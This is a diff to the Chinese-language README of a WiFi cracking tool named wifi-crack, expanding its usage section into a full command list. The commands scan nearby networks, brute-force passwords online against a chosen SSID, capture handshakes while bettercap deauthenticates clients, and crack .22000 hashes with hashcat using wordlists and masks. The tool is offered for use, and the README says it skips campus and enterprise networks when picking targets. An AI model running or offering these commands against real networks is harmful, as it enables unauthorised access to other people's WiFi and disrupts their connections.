@@ -130,29 +130,80 @@ brew install hashcat aircrack-ng bettercap hcxtools wireshark
 brew cleanup --prune=all
 ```
 
-## 使用
+## 完整命令列表
+
+### 扫描命令
 
 ```bash
-# ── 扫描模式 ──
+# 扫描附近WiFi（自动过滤校园网/企业网/开放网络）
 ./wifi-crack --scan
 
-# ── 默认模式: 万能钥匙 + 在线字典爆破 ──
-./wifi-crack
-./wifi-crack -t "TP-LINK_XXXX"
-./wifi-crack -d /path/to/dict.txt
-
-# ── 交互选择模式: 列出全部WiFi，手动单选/多选 ──
-./wifi-crack --all
+# 扫描全部WiFi（不过滤，含校园网/企业网等）
 ./wifi-crack --all --scan
 
-# ── 握手包捕获 + GPU离线破解（需sudo） ──
+# 查看版本号
+./wifi-crack --version
+```
+
+### 智能攻击模式（推荐，自动5阶段递进）
+
+```bash
+# 列出全部WiFi → 交互选择 → 自动执行5阶段攻击
+./wifi-crack --all
+
+# 带sudo运行（解锁Phase 3-4握手捕获+GPU破解）
+sudo ./wifi-crack --all
+
+# 交互选择 + 指定外部大字典
+sudo ./wifi-crack --all -d /path/to/big_wordlist.txt
+
+# 交互选择 + 调整在线爆破间隔为100ms
+sudo ./wifi-crack --all --delay 100
+```
+
+### 默认自动模式（自动过滤 + 在线爆破）
+
+```bash
+# 自动扫描过滤 → 万能钥匙预查 → 在线字典爆破
+./wifi-crack
+
+# 指定目标SSID
+./wifi-crack -t "TP-LINK_XXXX"
+
+# 指定目标 + 外部字典
+./wifi-crack -t "TP-LINK_XXXX" -d /path/to/dict.txt
+
+# 调整爆破间隔
+./wifi-crack --delay 100
+```
+
+### 握手包捕获模式（需sudo）
+
+```bash
+# 自动过滤目标 → tcpdump捕获 → bettercap deauth → hashcat GPU破解
 sudo ./wifi-crack --capture
+
+# 指定目标SSID
 sudo ./wifi-crack --capture -t "目标SSID"
 
-# ── hashcat独立破解（已有.22000哈希文件） ──
-./wifi-crack --hashcat --hash capture_hash.22000
-./wifi-crack --hashcat --hash capture_hash.22000 -d big_wordlist.txt
-./wifi-crack --hashcat --hash capture_hash.22000 --mask
+# 捕获 + 指定外部字典
+sudo ./wifi-crack --capture -t "目标SSID" -d /path/to/dict.txt
+```
+
+### hashcat独立破解模式（已有.22000哈希文件）
+
+```bash
+# GPU字典攻击（内置中国定制字典 + 本地wifi_dict.txt）
+./wifi-crack --hashcat --hash captures/xxxx_hash.22000
+
+# GPU字典攻击 + 指定外部大字典
+./wifi-crack --hashcat --hash captures/xxxx_hash.22000 -d rockyou.txt
+
+# 仅GPU掩码暴力攻击（8位纯数字起步）
+./wifi-crack --hashcat --hash captures/xxxx_hash.22000 --mask
+
+# 字典 + 掩码全流程
+./wifi-crack --hashcat --hash captures/xxxx_hash.22000 -d rockyou.txt
 ```
 
 ## 命令行参数
